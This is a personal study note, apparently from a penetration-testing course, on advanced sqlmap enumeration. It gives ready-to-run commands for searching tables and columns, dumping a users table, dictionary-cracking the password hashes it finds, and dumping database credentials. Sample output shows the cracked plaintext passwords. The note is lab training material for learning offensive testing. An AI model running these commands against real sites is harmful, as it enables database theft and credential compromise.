
***
###### `Title :- Advance Database Enumeration`
###### `Created on :- 2023-06-23 - 20:11`
###### `Created by:- Prem J`
***

#### `DB Schema Enumeration -->`

- To perform schema enumeration we add the `--schema` switch.

#### `Searching for Data -->`

- When dealing with complex databases there would be numerous databases involved, at this point the `--search` option would be of great use.
- This option enables to search for an identifier by using the `LIKE` operator internally similar to [[SQL Injection - manual and automated/SQL Injection - Automated/Database Enumeration/Database Enumeration#`Conditional Enumeration -->`|Database Enumeration]].

```shell-session
sqlmap -u "http://www.example.com/?id=1" --search -T user #table search
sqlmap -u "http://www.example.com/?id=1" --search -C pass #colmn search
```

>[!Note]
>Switch `--dump` is not compatible with `--search`

#### `Password Enumeration and Cracking -->`

- Once we identify a table containing passwords (e.g. `master.users`), we can retrieve that table with the `-T` option, as previously shown.
- SQLMap has automatic password cracking capabilities. Upon retrieving any value that resembles known hashes, SQLMap performs a dictionary-based attack on the found hashes.

```shell-session
premjampuram@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users

...SNIP...
do you want to crack them via a dictionary-based attack? [Y/n/q] Y

[14:31:41] [INFO] using hash method 'sha1_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/local/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[14:31:41] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N

[14:31:41] [INFO] starting dictionary-based cracking (sha1_generic_passwd)
[14:31:41] [INFO] starting 8 processes 
[14:31:41] [INFO] cracked password '05adrian' for hash '70f361f8a1c9035a1d972a209ec5e8b726d1055e'                                                                                                         
[14:31:41] [INFO] cracked password '1201Hunt' for hash 'df692aa944eb45737f0b3b3ef906f8372a3834e9'                                                                                                         
...SNIP...
[14:31:47] [INFO] cracked password 'Zc1uowqg6' for hash '0ff476c2676a2e5f172fe568110552f2e910c917'                                                                                                        
Database: master                                                                                                                                                                                          
Table: users
[32 entries]

...SNIP...
```

>[!Note]
>Hash cracking attacks are performed in a multi-processing manner, based on the number of cores available on the user's computer. Currently, there is an implemented support for cracking 31 different types of hash algorithms, with an included dictionary containing 1.4 million entries (compiled over the years with most common entries appearing in publicly available password leaks). Thus, if a password hash is not randomly chosen, there is a good probability that SQLMap will automatically crack it.

#### `DB Users Password Enumeration and Cracking -->`

- Apart from user credentials found in DB tables, we can also attempt to dump the content of system tables containing database-specific credentials (e.g., connection credentials). To ease the whole process, SQLMap has a special switch `--passwords` designed especially for such a task.

```shell-session
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```

>[!tip]
>The `--all` switch in combination with the `--batch` switch, will automatically do the whole enumeration process on the target itself, and provide the entire enumeration details.
>
>This basically means that everything accessible will be retrieved, potentially running for a very long time. We will need to find the data of interest in the output files manually.





